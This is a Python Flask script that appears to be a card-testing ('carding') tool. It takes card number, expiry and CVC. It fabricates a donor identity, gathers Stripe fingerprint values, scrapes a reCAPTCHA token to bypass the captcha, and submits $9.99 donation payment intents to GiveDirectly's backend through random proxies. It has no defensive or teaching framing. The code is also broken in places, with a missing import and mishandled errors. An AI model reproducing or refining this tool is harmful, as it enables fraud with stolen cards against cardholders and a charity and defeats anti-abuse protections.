from flask import Flask, request, jsonify
import requests
import json
import random

app = Flask(__name__)

def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def get_random_user():
    try:
        response = requests.get("https://randomuser.me/api?nat=us")
        response.raise_for_status()
        user_info = response.json().get("results", [])[0]
        first_name = user_info["name"]["first"]
        last_name = user_info["name"]["last"]
        email = f"{first_name}.{last_name}@yahoo.com"
        return first_name, last_name, email
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def get_stripe_data():
    api_url = "https://m.stripe.com/6"
    try:
        response = requests.post(api_url)
        response.raise_for_status()
        data = response.json()
        return data.get("muid"), data.get("guid"), data.get("sid")
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def bypass_captcha():
    try:
        request = requests.get("https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa")
        pattern = r'type="hidden" id="recaptcha-token" value="(.*?)"'
        token = re.search(pattern, request.text).group(1)

        if token:
            headers = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded",
            }
            data = {
                "v": "pCoGBhjs9s8EhFOHJFe8cqis",
                "k": "6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
                "c": token,
                "hl": "en",
                "size": "invisible",
            }
            url = "https://www.google.com/recaptcha/api2/reload?k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa"
            response = requests.post(url, headers=headers, data=data)
            response.raise_for_status()
            pattern = r'\["rresp","(.*?)"'
            return re.search(pattern, response.text).group(1)
        raise Exception("Failed to get captcha token")
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def get_card_info(ccn):
    try:
        url = f"https://lookup.binlist.net/{ccn}"
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        card_info = {
            "bank": data["bank"]["name"],
            "country": data["country"]["alpha2"],
            "type": data["type"].capitalize(),
            "brand": data["scheme"].capitalize(),
        }
        return card_info
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/process_card', methods=['POST'])
def process_card():
    proxies = load_proxies("proxies.txt")
    
    if not proxies:
        return jsonify({"error": "No proxies available"}), 500

    required_fields = ['ccn', 'month', 'year', 'cvc']
    if not all(field in request.form for field in required_fields):
        return jsonify({"error": "Missing one or more required data fields"}), 400

    ccn = request.form['ccn']
    month = request.form['month']
    year = request.form['year']
    cvc = request.form['cvc']

    try:
        first_name, last_name, email = get_random_user()
        muid, guid, sid = get_stripe_data()
        recaptcha_response = bypass_captcha()

        payload = {
            "cents": 999,
            "frequency": "once",
            "directDonationTo": "unrestricted",
            "emailAddress": email,
            "firstName": first_name,
            "lastName": last_name,
            "recaptchaResponse": recaptcha_response,
            "subscribeToEmailList": True,
        }
        
        proxy = {"http": f"http://{random.choice(proxies)}"}
        payment_req = requests.post(
            "https://www-backend.givedirectly.org/payment-intent",
            headers={"Content-Type": "application/json"},
            json=payload,
            proxies=proxy,
            timeout=10
        )
        payment_req.raise_for_status()
        payment_data = payment_req.json()
        
        # Further processing logic...
        
        return jsonify({"status": "Processing completed"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
